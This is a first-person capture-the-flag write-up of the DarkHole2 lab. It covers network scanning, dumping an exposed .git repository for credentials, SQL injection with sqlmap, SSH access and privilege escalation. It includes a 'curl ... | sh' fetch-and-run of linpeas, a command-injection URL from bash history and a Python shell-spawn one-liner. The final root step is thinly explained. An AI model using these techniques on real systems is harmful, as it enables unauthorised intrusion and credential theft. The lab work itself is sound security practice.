# DarkHole2

As always, starting my lab with a netdiscover command to see what machines are currently running in my network. I know the **192.168.19.129** IP is the victim machine since the other IPs are my machines that are up and running in a homelab.



I then run a nmap scan to see what ports are open: **nmap -Pn -sS -sC --script vuln 192.168.19.129**. Ports 22 and 80 are open. What's interesting is that there is an exposed route **/.git/** under port 80.

What I did from here was create a python env so I could install **git-dumper** which works similarly to wget but this tool works specifically for github repos. The **pip** command doesn't work in my terminal, hence why I created the env for this. I ran the following commands to create my env, activate it, and install git-dumper:

* python3 -m venv gitdumper-env
* source gitdumper-env/bin/activate
* pip install git-dumper

From here, I ran **git-dumper http://192.168.19.129/.git dumped_site** which created a folder called dumped_site/ and downloaded the exposed git repo there. To find logs on previous commits done in this repo, I ran **git log** which showed 3 commits. One was indicating that the user added default credentials into a php file. I then used **git show a4d900** which showed me the changes the user made in this commit. I can see the email used for the dark hole website login is **lush@admin.com** and the password is **321**. From here, I can go back to the website and login with these credentials.

Once I'm logged in, I do some digging around to see if I can find anything that could lead me to my next move. Looking in the URL as a logged in user, there is a parameter of **id** that has a value of 1. I had to do some research to see what tool would be best for this use case given the parameter. I found that sqlmap would be the best tool to use here as this automates the process of detecting and exploiting SQL injection flaws. Before using this tool, I would have to use Burp to capture an HTTP request since the parameter is only visible once I'm logged in so I need the cookie to set the connection.

After capturing the HTTP request and then saving it as a file, I can run **sqlmap -r dark --dump-run**. The -r is used to read the file which I named dark.

During the scan, the injections are successful and return two tables, a user table and a ssh table. This worked so I can now ssh into jehad's account. I run the command **ssh jehad@192.168.19.129**, input the password **fool** and I'm in the account.

Now that I have access to an account, it's time for privilege escalation. I switched to the tmp folder and tried to run the Linpeas script: **curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh**. This is a script that searches for potential paths to elevate privileges on Linux hosts and highlights them for a better understanding of those instances with potential exploits. This is my first time using this which was really insightful and I will definitely be using this again in other labs. In jehad's account, I eventually got into the losy directory and found one flag shown below:



When listing the files in jehad's directory, there is a bash history file which I read and found this which created a reverse shell: **http://127.0.0.1:9999/?cmd=id**



I encoded this command and got the password to ssh into losy's account:



I was able to log into losy's account successfully. I create a more interactive shell by running **python3 -c 'import os; os.system("/bin/sh")'**. I then used the whoami command to verify I was in the root user's account. I finally changed the directory I was in to the root directory which I saw the root.txt file was in.

